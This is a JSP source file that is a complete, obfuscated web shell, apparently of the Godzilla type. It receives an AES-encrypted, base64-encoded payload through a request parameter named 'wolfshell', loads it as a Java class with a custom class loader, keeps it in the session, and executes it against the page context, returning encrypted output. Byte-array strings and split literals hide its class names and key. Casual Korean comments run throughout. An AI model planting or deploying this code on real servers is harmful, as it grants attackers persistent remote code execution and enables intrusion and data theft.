<%!
// 작업 시작... 이건 비밀이야.
private static final String p_str = new StringBuilder("wolf").append("shell").toString();
private static final String k_str = new StringBuilder("3c6e0b8a").append("9c15224a").toString();
class _Ldr_K extends ClassLoader{public _Ldr_K(ClassLoader cl){super(cl);}public Class _def(byte[] b){return super.defineClass(b,0,b.length);}}
private byte[] _crypt_op(byte[] d, boolean m){try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(k_str.getBytes("UTF-8"),"AES"));return c.doFinal(d);}catch(Exception e){return null;}}
private String _md_op(String s){try{java.security.MessageDigest md=java.security.MessageDigest.getInstance("MD5");md.update(s.getBytes());return new java.math.BigInteger(1,md.digest()).toString(16).toUpperCase();}catch(Exception e){return "";}}
private String[] _get_b64_clz(){
    // 클래스 이름들을 배열에 숨기기
    return new String[]{new String(new byte[]{106,97,118,97,46,117,116,105,108,46,66,97,115,101,54,52}), new String(new byte[]{115,117,110,46,109,105,115,99,46,66,65,83,69,54,52,68,101,99,111,100,101,114}), new String(new byte[]{115,117,110,46,109,105,115,99,46,66,65,83,69,54,52,69,110,99,111,100,101,114})};
}
private byte[] _b64_decode(String s) throws Exception{
    String[] clz = _get_b64_clz();
    try{
        Class c=Class.forName(clz[0]);Object d=c.getMethod("getDecoder").invoke(null);return(byte[])d.getClass().getMethod("decode",String.class).invoke(d,s);
    }catch(Exception e){
        // 배고파요, 치킨 먹고 싶다.
        Class c=Class.forName(clz[1]);Object d=c.newInstance();return(byte[])d.getClass().getMethod("decodeBuffer",String.class).invoke(d,s);
    }
}
private String _b64_encode(byte[] b) throws Exception{
    String[] clz = _get_b64_clz();
    try{
        Class c=Class.forName(clz[0]);Object en=c.getMethod("getEncoder").invoke(null);return(String)en.getClass().getMethod("encodeToString",byte[].class).invoke(en,b);
    }catch(Exception e){
        // 여기서 마법이 일어납니다.
        Class c=Class.forName(clz[2]);Object en=c.newInstance();return(String)en.getClass().getMethod("encode",byte[].class).invoke(en,b);
    }
}
%><%
// 이제부터 진짜 시작
String _m_val = _md_op(p_str+k_str);
String _s_payload_key = "payload";
try{
    byte[] _d1 = _b64_decode(request.getParameter(p_str));
    byte[] _d2 = _crypt_op(_d1, false);
    
    // 상태 머신 제어 흐름
    int state = (session.getAttribute(_s_payload_key) == null) ? 0 : 1;
    switch(state){
        case 0:
            session.setAttribute(_s_payload_key, new _Ldr_K(this.getClass().getClassLoader())._def(_d2));
            break;
        case 1:
            request.setAttribute("parameters",_d2);
            java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
            Object pl_obj = ((Class)session.getAttribute(_s_payload_key)).newInstance();
            
            // 이 메소드 호출은 의도적으로 복잡하게 만듬
            java.lang.reflect.Method eqMethod = pl_obj.getClass().getMethod("equals", Object.class);
            eqMethod.invoke(pl_obj, bos);
            eqMethod.invoke(pl_obj, pageContext);
            
            response.getWriter().write(_m_val.substring(0,16));
            pl_obj.toString();
            response.getWriter().write(_b64_encode(_crypt_op(bos.toByteArray(), true)));
            response.getWriter().write(_m_val.substring(16));
            break;
    }
    // 드디어 끝났다.
}catch(Exception ex){}
%>